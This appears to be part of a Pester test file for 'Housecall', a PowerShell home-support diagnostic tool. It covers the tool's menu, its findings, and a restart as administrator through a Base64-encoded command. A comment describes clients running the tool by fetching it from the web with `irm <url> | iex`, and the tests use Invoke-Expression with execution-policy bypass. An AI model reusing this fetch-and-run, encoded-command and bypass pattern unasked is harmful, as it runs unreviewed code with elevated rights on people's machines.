        # Enter at the code: the plain note, but the code was asked, so the invoice was on offer.
        $out | Should Match 'Code uit Google Authenticator voor de factuur'
    }
}

Describe 'Restarting as administrator' {
    Mock Get-HcEnvironment {
        [pscustomobject]@{ IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'; IsAdmin = $false; Online = $false }
    }
    Mock Test-HcOnline { $false }
    Mock Get-HcNetworkFacts { New-FakeFacts @{ IPv4 = '169.254.1.1'; InternetMs = $null } }
    $newTemp = { @(Get-ChildItem $env:TEMP -Filter 'housecall-*.txt' -ErrorAction SilentlyContinue) }

    It 'offers a restart, starts an admin window at the same problem, and stops this one' {
        $script:HcSource = 'function Start-Housecall { }'
        $script:Launched = $null
        Mock Start-Process { $script:Launched = $ArgumentList }
        $before = @(& $newTemp).Count
        Start-Housecall -Lang en -Answers @('A1', '1', 'y', 'Q')
        Assert-MockCalled Start-Process -Times 1 -Exactly -Scope It -ParameterFilter { $Verb -eq 'RunAs' -and $FilePath -eq 'powershell.exe' }
        $script:HandedOff | Should Be $true
        $boot = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($script:Launched[-1]))
        $boot | Should Match "Start-Housecall -Start 'A1' -Lang 'en'"
        $boot | Should Match 'Remove-Item -LiteralPath'
        # The mock never ran the new window, so the hand-over file is still here: tidy it.
        $left = @(& $newTemp | Sort-Object LastWriteTime | Select-Object -Last 1)
        (@(& $newTemp).Count - $before) | Should Be 1
        [IO.File]::ReadAllText($left[0].FullName) | Should Be $script:HcSource
        Remove-Item $left[0].FullName
        $script:HcSource = $null
    }

    It 'cleans up and carries on when the person says No to Windows' {
        $script:HcSource = 'function Start-Housecall { }'
        Mock Start-Process { throw 'The operation was canceled by the user' }
        $before = @(& $newTemp).Count
        Start-Housecall -Lang en -Answers @('A1', '1', 'y', '', 'Q')
        $script:HandedOff | Should Be $false
        @(& $newTemp).Count | Should Be $before
        $script:HcSource = $null
    }

    It 'the start-up command really runs Housecall at the problem, and deletes the hand-over file' {
        $script:HcSource = Get-HcTestSource
        $script:Launched = $null
        Mock Start-Process { $script:Launched = $ArgumentList }
        Start-Housecall -Lang en -Answers @('A1', '1', 'y', 'Q')
        $script:HcSource = $null
        $encoded = $script:Launched[-1]
        $file = ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)) | Select-String "\`$f = '([^']+)'").Matches[0].Groups[1].Value
        Test-Path $file | Should Be $true
        # Run the same command without RunAs, in a fresh PowerShell with no console input.
        $out = & powershell.exe -NoProfile -NonInteractive -EncodedCommand $encoded 2>&1 | Out-String
        Test-Path $file | Should Be $false
        $out | Should Match 'A1  No internet at all'
        $out | Should Match 'What you asked for help with'
        $out | Should Not Match 'Exception|FullyQualifiedErrorId'
    }
}

Describe 'Findings' {
    It 'has a finding and an advice sentence, in both languages, for every finding id in the code' {
        $code = Get-Content (Join-Path $root 'src\checks\network.ps1') | Where-Object { $_ -match 'Set-HcFinding' }
        # The id right after "Set-HcFinding $r", or inside "{ 'id' }" when it is chosen by an if.
        $ids = @($code | ForEach-Object { [regex]::Matches($_, "(?:Set-HcFinding \`$r |\{ )'(\w+)'") | ForEach-Object { $_.Groups[1].Value } })
        $ids += $script:SecurityPriority
        $ids += @($script:SecurityChecks.Values | ForEach-Object { $_.Clean })
        # Area C names its findings as $found['id'], Set-HcFinding $r 'id', or the clean id last on Select-HcFinding.
        $ids += @('spaceFull', 'spaceLow')      # D4 renames diskFull / diskLow
        $ids += @(Get-Content (Join-Path $root 'src\checks\devices.ps1'), (Join-Path $root 'src\checks\sound.ps1'), (Join-Path $root 'src\checks\performance.ps1'), (Join-Path $root 'src\checks\updates.ps1'), (Join-Path $root 'src\checks\email.ps1') | ForEach-Object {
            [regex]::Matches($_, "\`$found\['(\w+)'\]|Set-HcFinding \`$r '(\w+)'|Select-HcFinding .* '(\w+)'\s*$") | ForEach-Object {
                @($_.Groups[1].Value, $_.Groups[2].Value, $_.Groups[3].Value) | Where-Object { $_ }
            }
        })
        $ids = $ids | Sort-Object -Unique
        $ids.Count | Should BeGreaterThan 25
        foreach ($lang in @('en', 'nl')) {
            foreach ($id in $ids) {
                $script:Strings[$lang]["finding.$id"] | Should Not BeNullOrEmpty
                $script:Strings[$lang]["advice.$id"] | Should Not BeNullOrEmpty
            }
        }
    }

    It 'has no {0} placeholders in advice, which is shown without values' {
        foreach ($lang in @('en', 'nl')) {
            $bad = @($script:Strings[$lang].Keys | Where-Object { $_ -like 'advice.*' -and $script:Strings[$lang][$_] -match '\{\d\}' })
            ($bad -join ', ') | Should Be ''
        }
    }

    It 'fills the finding placeholders when printing' {
        $r = New-HcReport
        Set-HcFinding $r 'unstable' @(30)
        { Write-HcReport $r } | Should Not Throw
    }
}

Describe 'Source files' {
    It 'are plain ASCII, so PowerShell 5.1 reads them correctly' {
        $files = @(Get-ChildItem (Join-Path $root 'src') -Filter *.ps1 -Recurse) +
                 @(Get-Item (Join-Path $root 'dev.ps1'), (Join-Path $root 'build.ps1'), (Join-Path $root 'tools\setup-ai.ps1'), (Join-Path $root 'tools\setup-invoice.ps1'))
        foreach ($f in $files) {
            $bytes = [System.IO.File]::ReadAllBytes($f.FullName)
            @($bytes | Where-Object { $_ -gt 127 }).Count | Should Be 0
        }
    }
}

Describe 'Start-Housecall (scripted run)' {
    Mock Get-HcEnvironment {
        [pscustomobject]@{
            IsWindows = $true; PSVersion = [version]'5.1'; Os = 'Windows 11 Home'
            IsAdmin = $false; Online = $false
        }
    }
    Mock Test-HcOnline { $false }

    Mock Get-HcNetworkFacts { New-FakeFacts }
    Mock Get-HcConnectionQuality { [pscustomobject]@{ Sent = 10; Lost = 0; AverageMs = 4 } }
    Mock Get-HcWifiDrops { 2 }
    Mock Get-HcSiteFacts { [pscustomobject]@{ Host = 'nu.nl'; HostsEntry = $null; Address = '1.2.3.4'; TcpMs = 12; HttpStatus = 200 } }

    Mock Get-HcSecurityFacts { New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24') -Running $true) } }

    It 'walks the menu in English without errors and ends on Q' {
        { Start-Housecall -Lang en -Answers @('A', '1', '', '0', 'F2', '', '?', '', 'zz', 'Q') } | Should Not Throw
    }

    It 'runs F1, F2 and F3 from the menu' {
        { Start-Housecall -Lang nl -Answers @('F1', '', 'F2', '', 'F3', '', 'Q') } | Should Not Throw
        Assert-MockCalled Get-HcSecurityFacts -Times 3 -Exactly -Scope It
    }

    It 'runs A1, A2 and A3 from the menu' {
        { Start-Housecall -Lang nl -Answers @('A1', '', 'A2', '', 'A3', 'geen site', 'nu.nl', '', 'Q') } | Should Not Throw
        Assert-MockCalled Get-HcSiteFacts -Times 1 -Exactly
        Assert-MockCalled Get-HcConnectionQuality -Times 1 -Exactly
    }

    It 'switches language with L' {
        Start-Housecall -Lang en -Answers @('L', 'Q')
        $script:Lang | Should Be 'nl'
    }

    It 'sends a described problem to the AI chat screen' {
        { Start-Housecall -Lang nl -DryRun -Answers @('mijn printer doet het niet', '', 'Q') } | Should Not Throw
    }

    It 'stops by itself when the answers run out' {
        { Start-Housecall -Lang en -Answers @('A') } | Should Not Throw
    }

    It 'treats an unknown -Lang as "use the Windows language"' {
        Start-Housecall -Lang de -Answers @('Q')
        $script:Lang | Should Be (Get-HcDefaultLanguage)
        Start-Housecall -Lang NL -Answers @('Q')
        $script:Lang | Should Be 'nl'
    }
}

# The hosted file is fetched and run with `irm <url> | iex`, where the param
# block turns into plain variable declarations. Run the built bundle exactly
# that way, in a fresh non-interactive PowerShell (Read-Host fails there, so
# Housecall reads Q and closes).
Describe 'setup.ps1 (the file clients fetch)' {
    $bundle = Join-Path $root 'setup.ps1'

    It 'builds' {
        & powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path $root 'build.ps1') | Out-Null
        $LASTEXITCODE | Should Be 0
        Test-Path $bundle | Should Be $true
    }

    It 'runs under a plain irm | iex' {
        $out = & powershell.exe -NoProfile -NonInteractive -Command "Get-Content -LiteralPath '$bundle' -Raw | Invoke-Expression" 2>&1 | Out-String
        $out | Should Match 'Housecall'
        $out | Should Not Match 'Exception|FullyQualifiedErrorId'
        $out | Should Match 'Nothing was left behind|Er is niets achtergebleven'
    }

    It 'takes options through the scriptblock form' {
        $out = & powershell.exe -NoProfile -NonInteractive -Command "& ([scriptblock]::Create((Get-Content -LiteralPath '$bundle' -Raw))) -Lang nl -DryRun" 2>&1 | Out-String
        $out | Should Match 'PROEFDRAAI'
    }

    It 'takes options when run as a file, as from the USB stick' {
        # Nothing to read from the keyboard: Housecall shows the menu and stops.
        $out = cmd.exe /c "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$bundle`" -Lang nl -DryRun < NUL" 2>&1 | Out-String
        $out | Should Match 'PROEFDRAAI'
        $out | Should Match 'Waar gaat het probleem over'
    }
}
